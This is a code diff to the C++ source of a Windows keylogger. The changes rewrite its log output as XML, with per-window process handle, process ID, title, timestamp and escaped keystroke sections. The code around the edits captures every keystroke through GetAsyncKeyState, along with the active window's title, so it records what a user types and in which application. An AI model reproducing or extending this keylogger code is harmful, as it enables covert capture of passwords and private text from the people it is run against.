@@ -15,8 +15,8 @@ FORCEINLINE char* _USER_SHIFT_FOCUS(HWND _PROG_HNDL)
     GetWindowTextA(_PROG_HNDL,_GRAB_WINDOW_TITLE,_FG_WINDOW_TITLELENGTH);
     char *TimeStamp=asctime(localtime(&hms));
     TimeStamp[strlen(TimeStamp)-1]=0x00;
-    cout<<"\n**NEW_PROCESS**\t**PROC_HNDL**\t"<<_PROG_HNDL<<" **END_PROC_HANDLE**\t**PROC_ID** "<<GetWindowThreadProcessId(_PROG_HNDL,NULL)
-    <<"** END_PROC_ID**\t **PROC_TITLE** "<<_GRAB_WINDOW_TITLE<<" **END_PROC_TITLE**\t **TIME_STAMP** "<<TimeStamp<<" **END_TIMESTAMP** "<<'\n';
+    cout<<"\n\t<Process>\n\t\t<ProcessHandle>"<<_PROG_HNDL<<"</ProcessHandle>\n\t\t<ProcessID>"<<GetWindowThreadProcessId(_PROG_HNDL,NULL)
+    <<"</ProcessID>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA["<<_GRAB_WINDOW_TITLE<<"]]></ProcessTitle>\n\t\t\t<TimeStamp>"<<TimeStamp<<"</TimeStamp>\n\t\t\t<keystrokes><![CDATA[";
     return 0 ;
 }
 
@@ -28,7 +28,7 @@ FORCEINLINE void EnterEvent(HWND _PROG_HNDL)
         strcpy(_GRAB_WINDOW_TITLE,_GRAB_WINDOW_TITLE_SECONDARY);
         char *TimeStamp=asctime(localtime(&hms));
         TimeStamp[strlen(TimeStamp)-1]=0x00;
-        cout<<"\n**PROC_TITLE**\t"<<_GRAB_WINDOW_TITLE_SECONDARY<<"\t**END_PROC_TITLE**\t **TIME_STAMP** "<<TimeStamp<<" **END_TIMESTAMP** "<<'\n';
+        cout<<"]]></keystrokes>\n\t\t</title>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA["<<_GRAB_WINDOW_TITLE_SECONDARY<<"]]></ProcessTitle>\n\t\t\t<TimeStamp>"<<TimeStamp<<"</TimeStamp>\n\t\t\t<keystrokes><![CDATA[";
     }
 }
 
@@ -41,13 +41,31 @@ FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyS
                {
                    Timer=clock();
                    Timer2=Timer;
-                   GetAsyncKeyState(VK_SHIFT)?cout<<Secondary: cout<<Primary;
+                   char temp = GetAsyncKeyState(VK_SHIFT)?Secondary:Primary;
+                   switch(temp)
+                   {
+                     case '<':  cout << "&lt;"; break;
+                     case '>':  cout << "&gt;"; break;
+                     case '&':  cout << "&amp;"; break;
+                     case '\'':  cout << "&apos;"; break;
+                     case '"':  cout << "&quot;"; break;
+                     default:  cout << temp; break;
+                   }
                    LastKeyStrokeLogged=VkPrimary;
                }
            if((Timer-clock())/500 && ((Timer2-clock())/31))
                {
                    Timer2=clock();
-                   GetAsyncKeyState(VK_SHIFT)?cout<<Secondary: cout<<Primary;
+                   char temp = GetAsyncKeyState(VK_SHIFT)?Secondary:Primary;
+                   switch(temp)
+                   {
+                     case '<':  cout << "&lt;"; break;
+                     case '>':  cout << "&gt;"; break;
+                     case '&':  cout << "&amp;"; break;
+                     case '\'':  cout << "&apos;"; break;
+                     case '"':  cout << "&quot;"; break;
+                     default:  cout << temp; break;
+                   }
                    LastKeyStrokeLogged=VkPrimary;
                }
            }
@@ -105,6 +123,7 @@ int main()
     char WD_[MAX_PATH];
     GetModuleFileName(NULL,WD_,MAX_PATH);
 
+    cout << "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n";
     HWND CURRENTPROCEESS=GetForegroundWindow();
     _USER_SHIFT_FOCUS(CURRENTPROCEESS);
     int LastKeyStrokeLogged;
@@ -130,6 +149,7 @@ int main()
         }
         else
         {
+            cout<<"]]></keystrokes>\n\t\t</title>\n\t</Process>";
             CURRENTPROCEESS=GetForegroundWindow();
             _USER_SHIFT_FOCUS(CURRENTPROCEESS);
         }
